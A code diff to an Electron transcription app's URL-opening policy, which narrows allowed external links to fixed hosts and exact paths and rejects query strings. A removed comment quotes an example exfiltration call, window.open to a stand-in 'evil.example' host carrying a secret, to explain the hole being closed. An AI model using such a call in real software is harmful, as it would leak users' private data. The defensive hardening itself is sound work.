@@ -1,46 +1,6 @@
-/**
- * Which external URLs the main process will hand to `shell.openExternal`.
- *
- * `setWindowOpenHandler` and `will-navigate` (see configureWindowSecurity in
- * main.ts) are the only renderer-reachable way out of the app. The renderer's
- * own CSP pins `connect-src 'self'`, so it cannot talk to the network itself —
- * which made these two handlers the single egress channel a compromised or
- * confused renderer could use. Allowing any `https:` URL there meant
- * `window.open("https://evil.example/?d=" + secret)` exfiltrated data through
- * the user's default browser, defeating the CSP entirely.
- *
- * The fix is a host allowlist rather than a protocol allowlist. The hosts below
- * are every external destination the renderer can actually produce:
- *
- * - `github.com` — RELEASES_URL, the manual-download fallback offered when the
- *   updater reports the build cannot self-update
- *   (src/components/update/UpdateStatusWidget.tsx).
- * - everything else — `provider.modelInfo.sourceUrl` rendered as the "Learn
- *   more" link beside each ASR provider (src/components/asr-provider-manager.tsx).
- *   Those URLs come from the sidecar's STATIC provider inventory
- *   (rust-sidecar/src/asr/mod.rs `AsrProviderType::all()`); every one of the
- *   twelve providers hard-codes its host, so this list is closed. Local model
- *   providers all point at huggingface.co; the cloud providers point at their
- *   own API documentation.
- *
- * `mailto:` was allowed and is deliberately gone: nothing in the renderer,
- * the sidecar, or index.html ever constructs one, so it was reachable surface
- * with no caller.
- *
- * The same rule is why `console.deepgram.com` and `aistudio.google.com` are
- * NOT here, even though both appear in the Deepgram and Gemini setup copy
- * ("Requires DEEPGRAM_API_KEY from https://console.deepgram.com"). That copy is
- * a provider `description` and a runtime-diagnostics message, and both are
- * rendered as plain text -- the renderer's only `href` to an external host is
- * `provider.modelInfo.sourceUrl` (asr-provider-manager.tsx) and its only
- * `window.open` is RELEASES_URL (UpdateStatusWidget.tsx). Nothing constructs a
- * navigation to either host, so adding them would widen the single egress
- * channel a compromised renderer has, for no caller. If a key-setup link is
- * ever made clickable, add the host in the same change as the link.
- *
- * Matching is exact host equality, never a suffix test: `evil-github.com` and
- * `github.com.evil.example` must not pass, and no provider needs a subdomain
- * wildcard.
+/** Renderer links may open only fixed documentation and model destinations.
+ * Multi-tenant hosts also serve attacker-controlled pages and redirects, so a
+ * hostname alone cannot authorize a path or a query carrying private text.
  */
 export const ALLOWED_EXTERNAL_HOSTS: readonly string[] = [
   // Cohere Transcribe → rust-sidecar/src/asr/cohere.rs
@@ -71,6 +31,49 @@ export const ALLOWED_EXTERNAL_HOSTS: readonly string[] = [
   // hurry, and because it is the same origin the app already trusts for updates.
   "plainsong.jonathanrreed.com",
 ];
+
+const ALLOWED_EXTERNAL_PATHS: Readonly<Record<string, readonly string[]>> = {
+  "github.com": [
+    "/", "/JonathanRReed/Plainsong", "/JonathanRReed/Plainsong/releases",
+    ...["fluid-speech-mini-LICENSE.txt", "fluid-speech-mini-NOTICE.txt",
+      "underdog-bark-3.0-pro-LICENSE.txt", "underdog-bark-3.0-pro-NOTICE.txt"]
+      .map((file) => `/JonathanRReed/Plainsong/releases/download/models-2026-10/${file}`),
+  ],
+  "docs.cohere.com": ["/docs/transcribe", "/docs/audio-transcription-quickstart"],
+  "console.groq.com": ["/docs/speech-to-text"],
+  "developers.openai.com": ["/guides/stt", "/api/docs/guides/speech-to-text"],
+  "elevenlabs.io": ["/docs/api-reference", "/docs/api-reference/speech-to-text"],
+  "developers.deepgram.com": ["/docs/pre-recorded-audio"],
+  "console.mistral.ai": ["/"],
+  "docs.mistral.ai": ["/capabilities/audio/speech_to_text/offline_transcription"],
+  "docs.x.ai": ["/"],
+  "ai.google.dev": ["/gemini-api/docs/transcribe", "/gemma/terms", "/gemma/prohibited_use_policy"],
+  "developer.apple.com": ["/documentation/speech"],
+  "learn.microsoft.com": ["/windows/ai/speech", "/en-us/windows/ai/apis/speech-recognition"],
+  "plainsong.jonathanrreed.com": ["/"],
+};
+
+const HUGGINGFACE_MODEL_CARDS = new Set([
+  "openai/whisper-large-v3", "openai/whisper-large-v3-turbo",
+  "distil-whisper/distil-large-v3.5", "Cactus-Compute/whistle",
+  "UsefulSensors/moonshine", "UsefulSensors/moonshine-tiny", "UsefulSensors/moonshine-base",
+  "onnx-community/cohere-transcribe-03-2026-ONNX", "andrewleech/qwen3-asr-0.6b-onnx",
+  "csukuangfj/sherpa-onnx-nemo-parakeet-tdt-0.6b-v3-int8",
+  "csukuangfj/sherpa-onnx-nemo-parakeet-tdt-0.6b-v2-int8",
+  "csukuangfj/sherpa-onnx-nemo-parakeet_tdt_ctc_110m-en-36000",
+  "handy-computer/parakeet-tdt-0.6b-v3-gguf", "oruk/orukeet",
+  "Qwen/Qwen3-ASR-1.7B", "Qwen/Qwen3-ASR-0.6B", "nvidia/parakeet-unified-en-0.6b",
+  "handy-computer/nemotron-3.5-asr-streaming-0.6b-gguf",
+  "moonshine-ai/moonshine-streaming-medium", "FluidVoice-Labs/fluid-speech-mini-gguf",
+  "ConwayResearch/Underdog-Bark-3.0-Pro", "handy-computer/Voxtral-Mini-3B-2507-gguf",
+  "handy-computer/Voxtral-Mini-4B-Realtime-2602-gguf",
+]);
+
+const HUGGINGFACE_LICENSE_PATHS = new Set([
+  "/oruk/orukeet/resolve/b59c13a733fce5cf193230d0fa317ee7f145a108/LICENSE-WEIGHTS",
+  "/oruk/orukeet/resolve/b59c13a733fce5cf193230d0fa317ee7f145a108/NOTICE.md",
+  "/nvidia/parakeet-unified-en-0.6b/resolve/fe53cd885760c96b6a5f51a0bfd362cb4584a98b/README.md",
+]);
 
 const ALLOWED_EXTERNAL_HOST_SET = new Set(ALLOWED_EXTERNAL_HOSTS);
 
@@ -108,7 +111,21 @@ export function isAllowedExternalUrl(rawUrl: string): boolean {
     return false;
   }
 
+  // Account controls link to this fixed usage page. Keep arbitrary ChatGPT
+  // paths, query strings and fragments outside the renderer's egress policy.
+  if (url.href === "https://chatgpt.com/settings/usage") {
+    return true;
+  }
+
   // Strip trailing dot if present so DNS root-relative hostnames (e.g., github.com.) normalize properly
   const hostname = url.hostname.endsWith(".") ? url.hostname.slice(0, -1) : url.hostname;
-  return ALLOWED_EXTERNAL_HOST_SET.has(hostname);
+  if (!ALLOWED_EXTERNAL_HOST_SET.has(hostname) || url.search || url.hash) {
+    return false;
+  }
+  if (hostname === "huggingface.co") {
+    return HUGGINGFACE_MODEL_CARDS.has(url.pathname.slice(1)) ||
+      HUGGINGFACE_LICENSE_PATHS.has(url.pathname) ||
+      /^\/ggerganov\/whisper\.cpp\/resolve\/5359861c739e955e79d9a303bcbc70fb988958b1\/ggml-(?:tiny|base|small|medium|large-v[123](?:-turbo)?)(?:\.en)?(?:-q[58]_0)?\.bin$/.test(url.pathname);
+  }
+  return ALLOWED_EXTERNAL_PATHS[hostname]?.includes(url.pathname) === true;
 }
